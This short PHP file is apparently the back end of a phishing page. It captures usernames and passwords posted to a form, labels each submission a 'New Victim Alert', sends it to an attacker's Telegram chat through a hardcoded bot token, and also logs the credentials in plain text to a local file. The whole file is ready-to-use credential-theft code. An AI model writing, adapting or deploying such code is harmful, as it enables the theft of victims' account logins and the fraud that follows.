<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Replace this 🔑
    $chat_id = "1559369377"; // Replace this 🔑

    $username = $_POST['username'];
    $password = $_POST['password'];

    $message = "🔥 New Victim Alert 🔥\n\nUsername: $username\nPassword: $password\n";

    $url = "https://api.telegram.org/bot$token/sendMessage";

    $data = json_encode([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $server_output = curl_exec($ch);
    curl_close($ch);

    // Logging for Debugging 🔥
    file_put_contents("log.txt", "Sent: $username | $password\n", FILE_APPEND);
}
?>
